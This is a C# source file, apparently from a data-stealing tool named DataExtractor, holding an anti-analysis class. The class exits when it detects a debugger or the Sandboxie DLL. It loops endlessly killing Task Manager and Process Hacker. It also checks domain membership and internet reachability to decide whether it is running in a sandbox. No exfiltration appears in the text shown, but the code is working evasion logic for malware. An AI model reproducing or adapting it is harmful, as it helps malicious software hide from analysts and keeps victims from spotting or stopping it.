using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;

namespace DataExtractor.Core.Handlers;

internal class DataChecker
{
	public static int nsoutputs = 0;

	public static int nprinters = 0;

	public static bool routputs = false;

	public static bool rprinters = false;

	public static bool riconnection = false;

	public static bool radcheck = false;

	public static bool result = false;

	public static bool resultmaybe = false;

	private static readonly List<string> ProcessName = new List<string> { "ProcessHacker", "taskmgr" };

	public static void RunAntiAnalysis()
	{
		if (DetectDebugger() || DetectSandboxie())
		{
			Environment.FailFast(null);
		}
		while (true)
		{
			DetectProcess();
			Thread.Sleep(10);
		}
	}

	private static bool DetectDebugger()
	{
		bool isDebuggerPresent = false;
		CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
		return isDebuggerPresent;
	}

	private static bool DetectSandboxie()
	{
		if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
		{
			return true;
		}
		return false;
	}

	private static void DetectProcess()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (ProcessName.Contains(process.ProcessName))
				{
					process.Kill();
				}
			}
			catch
			{
			}
		}
	}

	public static void ADCheck()
	{
		string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
		if (domainName == "")
		{
			Console.WriteLine("This computer is not currently joined to a domain");
			return;
		}
		Console.WriteLine("This computer is currently joined to the domain: ");
		Console.WriteLine(domainName);
		radcheck = true;
	}

	public static void HoldUp()
	{
		Ping ping = new Ping();
		PingReply pingReply = ping.Send("2147483646");
		if (pingReply.Status == IPStatus.Success)
		{
			int num = 0;
			Console.WriteLine("Sit back and enjoy the ride.", pingReply.Address.ToString());
			while (num < 250)
			{
				Console.WriteLine("You have {0} steps to the finish line.", num);
				num++;
				Thread.Sleep(1000);
			}
			Console.WriteLine("You have reached the finish line.");
		}
		else
		{
			Console.WriteLine(pingReply.Status);
		}
	}

	public static bool CheckForInternet()
	{
		try
		{
			Ping ping = new Ping();
			string hostNameOrAddress = "134744072";
			byte[] buffer = new byte[32];
			int timeout = 1000;
			PingOptions options = new PingOptions();
			PingReply pingReply = ping.Send(hostNameOrAddress, timeout, buffer, options);
			Console.WriteLine("This environment has internet connection !");
			riconnection = true;
			return pingReply.Status == IPStatus.Success;
		}
		catch (Exception)
		{
			Console.WriteLine("This environment has NO internet connection !");
			riconnection = false;
			return false;
		}
	}

	public static void DetectZ4ndb0x()
	{
		if (!routputs || !radcheck)
		{
			result = true;
			return;
		}
		if ((routputs && radcheck && !rprinters && !riconnection) || (routputs && radcheck && rprinters && !riconnection) || (routputs && radcheck && !rprinters && riconnection))
		{
			resultmaybe = true;
			return;
		}
		result = false;
		resultmaybe = false;
	}

	public static void MakeAChoice()
	{
		if (result)
		{
			Console.WriteLine("Try Again !");
		}
		else if (resultmaybe)
		{
			Console.WriteLine("Do you want to play a game ?");
			HoldUp();
		}
		else
		{
			Console.WriteLine();
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
}
